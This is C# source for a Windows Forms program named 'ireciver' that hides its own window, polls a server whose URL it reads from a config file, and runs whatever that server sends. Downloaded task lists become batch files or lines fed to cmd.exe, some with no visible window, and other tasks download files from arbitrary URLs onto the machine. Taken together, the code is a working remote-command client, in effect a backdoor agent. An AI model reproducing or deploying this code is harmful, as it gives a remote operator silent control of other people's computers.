using System;
using System.Collections.Generic;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Windows.Forms;
using System.Net;

namespace ireciver
{
    public partial class Form1 : Form
    {
        long counteer=0;
        string HomePath = Path.GetDirectoryName(Application.ExecutablePath);
        string HttpUrl = File.ReadLines(Path.GetDirectoryName(Application.ExecutablePath) + "\\Http.cfg").Skip(0).Take(1).First();
        long CurrentSession;
        long NextSession;
        string[] TaskLists;
        string SessionPath = Path.GetDirectoryName(Application.ExecutablePath) + "\\session.txt";

        WebClient wb = new WebClient();
        public Form1()
        {
            InitializeComponent();
            msLabel.Text = counteer.ToString();
            if (!File.Exists(Path.GetDirectoryName(Application.ExecutablePath) + "\\session.txt"))
            {
                File.WriteAllText(SessionPath, "0");
                CurrentSession = 0;
            }

            latencyTimer.Start();

           // this.Hide();
            timerhide.Start();
        }


        private void latencyTimer_Tick(object sender, EventArgs e)
        {
            counteer++;
            msLabel.Text = counteer.ToString();
            if (!latencyWorker.IsBusy) latencyWorker.RunWorkerAsync();
            
            
        }


        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            
            try
            {
                CurrentSession = Int64.Parse(File.ReadLines(SessionPath).Skip(0).Take(1).First());
                NextSession = Int64.Parse(wb.DownloadString(HttpUrl+"session.txt"));
                if (CurrentSession < NextSession)
                {
                    WebClient sr = new WebClient();
                    byte[] dataStream = sr.DownloadData(HttpUrl + "task.txt");
                    string tmpString = ASCIIEncoding.ASCII.GetString(dataStream);
                    TaskLists = tmpString.Split(new string[] { "\r\n" }, StringSplitOptions.None);
                    if (TaskLists[0].ToString() == "#batch") BatchOperation();
                    if (TaskLists[0].ToString() == "#hidebatch") HideBatchOperation();
                    if (TaskLists[0].ToString() == "#intellibatch") IntelliBatch();
                    if (TaskLists[0].ToString() == "#get") get();
                    if (TaskLists[0].ToString() == "#import") import();
           
                }
            }

            catch (Exception)
            {
                latencyWorker.CancelAsync();
            }
           
        }

        private void backgroundWorker1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            if (CurrentSession < NextSession)
            {
               
                File.WriteAllText(SessionPath, NextSession.ToString());
            }
            //stringBox.AppendText(Environment.SystemDirectory+"\r\n");

        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (!latencyWorker.IsBusy) latencyWorker.RunWorkerAsync();
        }

        private void BatchOperation()
        {
            StreamWriter sw = new StreamWriter(HomePath+"\\BatchOperation.bat");
            foreach (string task in TaskLists)
            {
                if (!task.Contains("#batch")) sw.WriteLine(task);
            }
            sw.Close();
            sw.Dispose();

            Process p = new Process();
            p.StartInfo.WorkingDirectory = HomePath;
            p.StartInfo.FileName = "BatchOperation.bat";
            p.Start();
        }

        private void HideBatchOperation()
        {
            StreamWriter sw = new StreamWriter(HomePath + "\\HideBatchOperation.bat");
            foreach (string task in TaskLists)
            {
                if (!task.Contains("#hidebatch")) sw.WriteLine(task);
            }
            sw.Close();
            sw.Dispose();

            Process p = new Process();
            p.StartInfo.WorkingDirectory = HomePath;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.FileName = "HideBatchOperation.bat";
            p.Start();
        }

        private void IntelliBatch()
        {
            Process p = new Process();
            p.StartInfo.WorkingDirectory = HomePath;
            foreach (string task in TaskLists)
            {
                if (!task.Contains("#intellibatch"))
                {
                    p.StartInfo.FileName = "cmd.exe";
                    p.StartInfo.CreateNoWindow = true;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.Arguments = "/C " + task;
                    p.Start();
                    p.WaitForExit();
                }
            }
            
        }

        private void get()
        {
            WebClient wed = new WebClient();
            wed.DownloadFile(TaskLists[1],TaskLists[2]);
        }

        private void import()
        {
            WebClient wed = new WebClient();
            wed.DownloadFile(TaskLists[1],HomePath + "\\"+TaskLists[2]);
        }

        private void unused()
        {
            
        }

        private void timerhide_Tick(object sender, EventArgs e)
        {
            this.Hide();
            this.Opacity = 100;
            timerhide.Stop();
        }
    }
}
